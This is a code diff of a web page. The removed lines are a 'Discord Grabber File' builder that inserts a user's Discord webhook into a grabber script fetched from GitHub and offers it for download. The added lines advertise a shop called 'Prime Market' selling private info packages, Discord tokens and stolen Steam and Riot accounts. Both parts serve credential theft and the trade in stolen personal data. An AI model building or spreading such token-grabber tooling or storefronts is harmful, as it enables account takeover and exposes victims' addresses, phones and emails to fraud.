@@ -8,6 +8,7 @@
 </head>
 <body>
     <div class="border-top">
+        <img src="home.png" alt="" onclick="window.location.href='index.html'">
         <div class="dropdown-container">
             <div class="dropdown">
                 <button class="dropdown-btn">Discord</button>
@@ -29,12 +30,33 @@
         </div>
     </div>
     <div class="container">
-        <h1><u>Discord Grabber File</u></h1>
-        <textarea name="" id="webhookUrlText" placeholder="webhook url" rows="5" cols="40"></textarea>
-        <button type="button" class="btn" onclick="downloadSetupFile()">Download Setup File</button>
-        <button type="button" class="btn" onclick="getGrabberFile(document.getElementById('webhookUrlText').value)">Get Grabber File</button>
-        <a href="sites/files/setup-grabberTool.bat" id="setupFile"></a>
+        <h1><u>What is Prime Market?</u></h1>
+        
+        <div class="paymentBox">
+            <h4><u>How can you pay?</u></h4>
+            <img src="https://newsroom.deatch.paypal-corp.com/images/fillers/Wordmark%20on%20gold.png" alt="" width="200px">
+            <p><u>Why PayPal?</u></p>
+            <p>It is just easy and fast to use</p>
+        </div>
+
+        <div class="freeBox">
+            <h4><u>What do you get for free?</u></h4>
+            <p>• You can use our free generator</p>
+            <p>• You get invite rewards</p>
+            <p>• We will drop accounts, methods and more in the future</p>
+            <p>• We will make giveaways in the future</p>
+        </div>
+
+        <div class="offerBox">
+            <h4><u>What do we offer?</u></h4>
+            <p>• Private Info Packages</p>
+            <p>(addres, name, phone, email acces)</p>
+            <p>• Discord Tokens</p>
+            <p>• Accounts like steam, riot, ...(more in the future)</p>
+        </div>
+
         <div class="border-bottom">
+            <h2>Our Discord Server: </h2>
             <img src="sites/img/discord.png" onclick="window.open('https://discord.gg/7KbXcb6AxH', '_blank')"> 
         </div>
     </div>
@@ -42,42 +64,6 @@
 </body>
 </html>
 <script>
-    async function getGrabberFile(webhookUrl) {
-        if(webhookUrl.startsWith("https://discord.com/api/webhooks")) {
-            try {
-                // URL der Datei auf GitHub
-                const url = 'https://raw.githubusercontent.com/Paloox/discordGrabberFile/main/grabber.py';
-                // Datei von GitHub abrufen
-                const response = await fetch(url);
-                if (!response.ok) throw new Error('Network response was not ok');
-                let text = await response.text();
-                // Wort ersetzen
-                const originalWord = '%webhook_url%';
-                const newWord = webhookUrl;
-                const modifiedText = text.replace(new RegExp(originalWord, 'g'), newWord);
-                // Blob-Datei erstellen
-                const blob = new Blob([modifiedText], { type: 'text/plain' });
-                const urlBlob = URL.createObjectURL(blob);
-                // Download-Link erstellen
-                let a = document.createElement('a');
-                a.href = urlBlob;
-                a.download = 'discordGrabber.py';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                // URL wieder freigeben
-                URL.revokeObjectURL(urlBlob);
 
 
-            } catch (error) {
-                console.error('Error fetching or modifying the file:', error);
-            }
-        } else {
-            alert("Wrong Discord Webhook!");
-        }
-    }
-
-    function downloadSetupFile() {
-        document.getElementById('setupFile').click();
-    }
 </script>
